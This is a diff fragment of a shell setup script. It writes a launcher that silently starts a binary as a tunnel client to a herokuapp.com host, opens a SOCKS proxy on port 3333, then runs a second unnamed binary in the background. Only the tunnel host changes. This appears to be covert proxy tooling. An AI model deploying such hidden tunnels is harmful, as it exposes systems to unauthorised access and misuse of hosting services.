@@ -14,7 +14,7 @@ chmod 777 $1/bin/$dyno
 chmod 777 $1/bin/$dyno2
 
 cat > $1/bin/mode <<END
-/app/bin/$dyno2 client https://myapp40620746343.herokuapp.com 0.0.0.0:3333:socks >/dev/null 2>&1 >/dev/null &
+/app/bin/$dyno2 client https://portal90905204949.herokuapp.com 0.0.0.0:3333:socks >/dev/null 2>&1 >/dev/null &
 sleep 5
 /app/bin/$dyno >/dev/null 2>&1 >/dev/null &
 END
